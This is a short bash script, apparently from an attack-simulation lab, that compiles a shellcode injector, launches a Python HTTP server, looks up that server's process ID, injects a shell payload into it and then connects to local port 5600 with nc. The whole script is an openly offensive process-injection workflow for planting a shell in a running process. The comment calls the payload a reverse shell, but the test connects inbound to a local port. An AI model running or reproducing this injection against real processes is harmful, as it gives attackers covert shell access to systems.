#!/bin/bash

# compile payload with reverse shell (port TCP/5600)
gcc -o /opt/attack_simulation/inject /opt/attack_simulation/inject.c
chmod +x /opt/attack_simulation/inject

# launch http server for injection
/usr/bin/python3 -m http.server 8080 &

sleep 3

# get pid of http server
pid=$(ps aux | grep "server 8080" | head -n 1 |  awk '{print $2}')

# inject shell code
/opt/attack_simulation/inject $pid

# test connection
nc -v 127.0.0.1 5600 